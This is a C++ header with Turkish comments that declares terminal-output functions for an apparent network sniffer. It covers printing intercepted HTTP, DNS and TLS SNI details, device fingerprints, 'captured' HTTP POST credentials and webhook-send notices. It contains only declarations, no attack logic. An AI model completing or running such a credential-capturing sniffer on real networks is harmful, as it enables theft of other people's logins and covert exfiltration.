#pragma once
#include <string>
#include <vector>
#include <utility>
#include <cstdint>

// ============================================================
//  display.hpp — Renkli terminal çıktısı (Windows Console API)
// ============================================================

namespace Display {

    // ANSI renk kodları (Win10+ destekler)
    constexpr const char* RESET   = "\033[0m";
    constexpr const char* RED     = "\033[91m";
    constexpr const char* GREEN   = "\033[92m";
    constexpr const char* YELLOW  = "\033[93m";
    constexpr const char* BLUE    = "\033[94m";
    constexpr const char* MAGENTA = "\033[95m";
    constexpr const char* CYAN    = "\033[96m";
    constexpr const char* WHITE   = "\033[97m";
    constexpr const char* GRAY    = "\033[90m";
    constexpr const char* BOLD    = "\033[1m";

    // Terminal'i başlat (ANSI modunu etkinleştir)
    void Init();

    // Banner bas
    void PrintBanner();

    // Timestamp al (HH:MM:SS formatında)
    std::string GetTimestamp();

    // HTTP paketi için çıktı
    void PrintHTTP(
        const std::string& timestamp,
        const std::string& src_ip,
        const std::string& dst_ip,
        const std::string& src_mac,
        const std::string& vendor,
        const std::string& method,
        const std::string& host,
        const std::string& path,
        const std::string& user_agent,
        const std::string& os_guess,
        const std::string& content_type,
        int src_port,
        int dst_port
    );

    // DNS sorgusu için çıktı
    void PrintDNS(
        const std::string& timestamp,
        const std::string& src_ip,
        const std::string& src_mac,
        const std::string& vendor,
        const std::string& queried_domain
    );

    // Genel bilgi mesajı
    void PrintInfo(const std::string& msg);

    // Hata mesajı
    void PrintError(const std::string& msg);

    // Interface listesi
    void PrintInterface(int idx, const std::string& name, const std::string& desc, const std::string& ip);

    // Webhook gönderim bildirimi
    void PrintWebhookSent(bool success);

    // TLS/HTTPS SNI yakalandı
    void PrintTLS(
        const std::string& timestamp,
        const std::string& src_ip,
        const std::string& dst_ip,
        const std::string& src_mac,
        const std::string& vendor,
        const std::string& sni,
        const std::string& tls_version,
        int src_port,
        int dst_port
    );

}

namespace Credential {
    struct CredEntry;
}

namespace Display {
    // HTTP POST credential yakalandı
    void PrintCredential(
        const std::string& timestamp,
        const Credential::CredEntry& cred
    );

    // Separator çiz
    void PrintSeparator();
}
